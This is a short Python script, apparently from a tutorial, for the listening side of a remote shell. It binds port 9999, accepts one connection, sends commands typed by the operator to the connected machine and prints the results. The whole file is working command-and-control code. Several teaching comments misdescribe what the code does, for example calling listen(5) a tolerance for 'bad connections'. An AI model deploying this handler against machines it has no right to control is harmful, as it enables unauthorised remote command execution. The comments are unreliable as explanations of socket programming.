import socket
import sys

#create a socket

def create_socket():
    # try and except are like functions; they'll be active when s=socket.socket() isn't working
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        # print to make sure the bind func is working
        print("Binding the port number " + str(port))
        s.bind((host, port))

        # 5 means it's going to tolerate 5 bad connections
        s.listen(5)

    # in this part when the code moves to except, it will call the bind func to retry
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\nRetrying...")
        bind_socket()

# Establish a connection with a client (socket must be listening)

def socket_accept():
    # this will list the ip and port
    conn, adress = s.accept()

    # ip address will be in strings but the port will be an integer, so we need to convert it into an integer
    print("Connection has been established! |" + "IP: " + adress[0] + "| Port: " + str(adress[1]))
    send_commands(conn)
    conn.close()

# Send commands to the client (infinite while loop is created so that the command does not stop after one command)
def send_commands(conn):
    while True:
        # cmd is just a variable that will tell us to input; it'll only close if it's told to quit
        # sys.exit will close the terminal
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        # when sending commands from one computer to another, it will be sent using bits
        # so first, we have to encode the file format
        # and "len" is to know if the user typed a "str" > 0
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))

            # the data that is received from the client is in bits form, so we need to convert it into a string
            # utf-8 is the encoding type which is string
            # end="" will let us move to the next line
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")

# send_commands is getting called on socket_accept
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
